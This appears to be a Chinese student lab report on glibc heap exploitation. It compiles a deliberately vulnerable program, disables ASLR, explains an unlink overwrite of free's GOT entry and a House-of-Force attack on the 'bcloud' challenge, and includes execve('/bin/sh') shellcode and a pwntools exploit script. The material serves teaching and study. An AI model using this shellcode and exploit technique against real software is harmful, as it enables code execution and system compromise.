为实验方便 我们采用ssh连接虚拟机

先查看ip地址是192.168.56.141

![image-20220606145140357](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606145140357.png)

然后用xshell ssh连接该虚拟机 并且提前把实验素材放置到共享文件夹

共享文件夹挂载到 /mnt/hgfs

![image-20220606145250844](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606145250844.png)

开始实验

# 0 

在 `/home/vagrant` 解压 glibc 的压缩包

`cp glibc-2.20-lwm.tgz /home/vagrant`

`cd /home/vagrant`

`tar -xzvf ./glibc-2.20-lwm.tgz`

建立一个目录`/home/vagrant/glibc-build`, 进入这个目录后编译 glibc

```bash
mkdir glibc-build
ls
cd ./glibc-build
../glibc-2.20/configure --prefix=/home/vagrant/glibc-build/
make && make install
```

![image-20220606151254181](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606151254181.png)

编译完成

 编译 `vuln.c`

```bash
cd /mnt/hgfs/host-share/
cp vuln.c /home/vagrant/
cd /home/vagrant
gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/vagrant/glibc-build/lib -Wl,--dynamic-linker=/home/vagrant/glibc-build/lib/ld-linux.so.2
```

使用 `ldd` 命令, 可以看到 `libc.so.6` 链接到了刚才编译的 libc 库

```bash
ldd vuln
```

![image-20220606151507632](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606151507632.png)

用普通方式编译 `attack.c`, 并使用 `ldd` 命令查看链接情况

```bash
cp /mnt/hgfs/host-share/attack.c /home/vagrant/
gcc -o attack attack.c
ldd attack
```

![image-20220606151608110](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606151608110.png)

关闭系统随机化

```bash
echo 0 | sudo tee -a /proc/sys/kernel/randomize_va_space
```

![image-20220606151632127](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606151632127.png)

执行 `attack`, 然后可以看到出现了一个 shell, 即利用 shellcode 得到了 shell

![image-20220606151652899](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/image-20220606151652899.png)

# 1-1

> attack.c中680这个数值怎么来的？在分配的内存中覆盖了哪些范围，请画图说明

attack.c中680这个数值怎么来的？
当代码中执行first=malloc(666) 时, 下一个 chunk 的 pre_size 可以被当前的chunk所使用, 所以当前的chunk的数据部分为666-4=662B. 但是在 32 位操作系统中需要地址对齐,  所以需要再填充两个字节变为664B。所以first chunk 的DATA部分有 664B。
后续的16 字节用于填充 second = malloc(12) 的 chunk 的 pre_size, size, fd 和 bk 共 4*4=16 字节.

总计664+16=680

在分配的内存中覆盖了哪些范围:
first 的 chunk 的数据部分以及 second 的 chunk 的 pre_size, size, fd 和 bk 字段.
画图:

![1](%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.assets/1.png)



# 1-2

> attack.c中覆盖第二个chunk的元数据fd指针，为什么要使用func_point-12 ?

为了能让 shellcode 的地址进free 函数的起始地址.

先看unlink宏中操作双向链表的语句

```C
/* Take a chunk off a bin list */    // 摘除双向链表的chunk元素
#define unlink(AV, P, BK, FD) { \    //AV为arena, P指向需要unlink的chunk
	FD = P->fd; \
	BK = P->bk; \
	FD->bk = BK; \
	BK->fd = FD; \
}
```

注意到func_point 的值为函数 free 的地址.
在 vuln.c 的 malloc 的分配情况下, 在FD = P->fd中, P就是second的chunk 结构, 在 attack.c 中, 将即第二个chunk 的 fd 设为 (free addr)-12, 所以在unlink 宏中, FD 即为 (free addr)-12.
对于BK = P->bk, 在 attack.c 中, BK 被设置为了 shellcode_addr 也就是 shellcode 的地址.
所以对于FD->bk = BK, 因为FD是(free addr)-12, 这里是作为一个chunk, 所以 FD->bk=((free addr)-12)+12=free addr,然后被赋值为 BK, 也就是把shellcode 的地址写入free函数的地址, 这样如果调用free 函数的话就会执行 shellcode.

# 1-3

> shellcode开头是eb0a，表示跳过12个字节，为什么要跳过后面的"ssppppffff" ？ 另外请反汇编shellcode解释shellcode的功能

跳过后面的原因:
跳过的原因同样与上述 unlink 宏有关. 接 #2 题继续分析, 最后执行 BK->fd = FD, 将 FD 即 (free addr)-12 赋值给 BK->fd. 由于 BK 指向 shellcode 首地址, 而 BK->fd 即 (shellcode addr)+8, 所以会跳过 shellcode 的前 8 个字节. 而又因为 BK->fd = FD 会将 BK 的 8~11 个字节设置为 FD的值, 同样不为真正执行的代码. 因此真正有效的可以执行的部分要跳过 shellcode 前面的 8+4=12 字节.
反汇编 shellcode:

```asm
31C0          xor eax,eax
50            push eax 
68 2F2F7368   push 0x68732F2F    ;//sh
68 2F62696E   push 0x6E69622F    ;/bin
89E3          mov ebx,esp
50            push eax
89E2          mov edx,esp
53            push ebx
89E1          mov ecx,esp
B0 0B         mov al,0xB
CD 80         int 0x80
```

shellcode 功能:

注意int 80系统调用, 此时eax 的值是0xB 得到系统调用为sys_execve. 所以此处调用了函数 execve(), 参数是 /bin/sh. 所以功能就是让程序获得系统的 shell 控制权, 执行 shell.PS: 

# 1-4

> vuln.c中第一次调用free的时候是什么情况下进行chunk的consolidation的？依据glibc源代码进行分析，给出分析过程

分配 666 字节 chunk:
32 位: 实际分配时, 需要包括该 chunk 的 pre_size 和 size 字段共 8 字节, 同时, 复用了下一个 chunk 的 pre_size 字段的 4 个字节, 因此数据部分只有 662 字节, 由于需要对齐还要填充 2 字节, 因此总共需要 672 字节. 不小于 512 个字节, 属于 Large bins.
64 位: 需要包括该 chunk 的 pre_size 和 size 字段共 16 字节, 复用了下一个 chunk 的 pre_size 字段的 8 字节, 数据共有 658 字节, 需要 16 字节对齐需要填充 14 字节, 因此总共需要 658+14+16=688 字节, 属于 Small bins.
分配 12 字节 chunk:
32 位: 分配原理同上, 一共需要 12+8-4=16 字节. 属于 Fast bins.
64 位: 分配原理同上, 一共需要 12+16-8+12=32 字节. 属于 Fast bins.

# 2-1

> 学习pwntools的使用方法，提交改写后的exploit的Python代码

```PY
from pwn import *  


context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32

func_point = 0x08049778

shellcode_addr = 0x804a008 + 0x10

shellcode = b"\xeb\x0assppppffff\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\
xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


def make_input():
    p = p32(0xdefaced) * 4
    p += shellcode
    p += ((680-4*4)-(4*4+len(shellcode)))*b'B'
    p += p32(0xffffffff)
    p += p32(0xfffffffc)
    p += p32(func_point - 12)
    p += p32(shellcode_addr)
    return p


m_input = make_input()
with open('input_str_py', 'wb') as f:
    f.write(m_input)


start = process(argv=['./vuln', m_input])

start.interactive()

```

# 2-2

> 请解释exploit脚本中第96行到第100行代码的含义，其中pos变量的值是怎么计算出来的，目的是什么？：

``` PY
 96 heapBase = leakAddr - 8
 97 pos = 0x804b120 - (heapBase+0x48*3+0x48*4+16)
 98 payload1 = ''
 99 print '=== 5 new note, pos:', pos
100 new_note(str(pos), payload1)

```

- 代码含义:
  leakAddr 是泄露出的数据部分的地址, 减去 8 之后得到的是分配的 chunk 的首地址. 通过调试 bcloud 程序可以知道 bss 段的起始地址为 0x0804b060为 note 指针区域. 通过计算 pos 值, 将 topchunk 的 size 为 0xffffffff, 从而可以覆盖所有内存空间进而可以在任意地址写内容.

- pos 值的计算:
  
  因为下一个 chunk 的地址是 nextChunkAddr=topChunkAddr+nb, 而要使 nextChunkAddr=0x0804b120-0x8(chunk 头部 8 字节偏移), 所以topChunkAddr=heapBase+0x48*3+0x48*4, nb=0x804b120-topChunkAddr-0x8. 又因为 chunk 需要地址对齐, 所以 nb=(req+SIZE_SZ+MALLOC_ALIGN_MASK)&~MALLOC_ALIGN_MASK), 则需要 req=nb-8, 得 pos=0x804b120-(heapBase+0x48*3+0x48*4+16).
  
- 目的:
  目的是将 Top chunk 抬至 bss 段 note 指针处(0x0804b120), 以达到下次进行 malloc 时能通过修改 content 指针数组来达到在任意地址写入内容.

# 2-3

> 请解释为什么第118行到121行代码可以泄露出printf的地址？

```PYTHON
118 #leak printf address
119 print "=== 9 del note"
120 leak_str= del_note('1', True)
121 printf_leak_addr = u32(leak_str[1:5])
```

在此之前, note 指针数组的前两个指针分别被覆盖为了 p32(got_free) 和 p32(got_printf), 即当前 note 表里 id 为 0 的 note 的地址实际上为 free@got.plt 的地址. 接着又将其改为了 printf@plt 的地址. 这样在使用 del 中的调用函数 free 时实际上就是在调用 printf. 而参数是 id 为 1 的地址即 got_printf, 这样相当于是 printf(printf@plt), 即打印的就是 printf 的地址.

